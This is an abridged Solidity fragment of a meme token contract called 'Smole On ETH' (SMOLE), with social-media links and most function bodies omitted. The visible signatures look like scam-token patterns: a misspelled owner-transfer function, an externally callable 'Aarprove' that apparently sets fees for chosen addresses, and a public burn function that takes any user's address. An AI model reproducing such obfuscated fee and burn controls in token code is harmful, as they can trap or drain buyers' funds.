...
/**
https://t.me/smoleoneth
https://twitter.com/smoleoneth
Smole On Eth
*/
...
abstract contract Ownable {
    ...
    function transferOwnershiplenmoslgsd(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract SMOLE is Ownable {
    ...
    constructor (){
        name = unicode"Smole On ETH";
        symbol = unicode"SMOLE";
        decimals = 9;
    ...
    function Aarprove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliyttliytyses(address user) public {
